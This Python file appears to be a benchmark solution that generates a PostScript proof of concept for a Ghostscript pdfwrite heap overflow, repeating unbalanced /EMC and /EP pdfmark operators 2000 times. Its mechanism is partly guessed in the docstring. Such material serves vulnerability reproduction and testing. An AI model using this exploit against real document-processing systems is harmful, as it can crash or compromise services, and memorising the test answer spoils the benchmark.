import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability (oss-fuzz:42535696) is a heap buffer overflow in the pdfwrite device
        of Ghostscript. It occurs when the code attempts to restore the viewer state without
        checking if the viewer depth is at least 1, leading to a stack underflow or 
        out-of-bounds access.
        
        This can be triggered by supplying unbalanced "End" operators via pdfmark, such as 
        /EMC (End Marked Content) or /EP (End Paragraph), which likely map to the 
        vulnerable state restoration logic.
        """
        
        # We construct a PostScript file because it allows direct invocation of 
        # pdfwrite-specific operators (pdfmark) and is processed by Ghostscript.
        
        # Header
        poc = b"%!PS\n"
        
        # Basic setup to ensure the device is initialized and page content processes
        poc += b"10 10 moveto (PoC) show\n"
        
        # Payload:
        # Repeatedly execute unbalanced end-state operators.
        # If the viewer_depth starts at 0 (or a small number), these operations 
        # will cause it to decrement below zero (underflow) or wrap around,
        # triggering the heap buffer overflow when the state array is accessed.
        # We use a large number of iterations to ensure we hit the underflow condition.
        
        ops = b"[ /EMC pdfmark\n[ /EP pdfmark\n"
        poc += ops * 2000
        
        # Finalize the page
        poc += b"showpage\n"
        
        return poc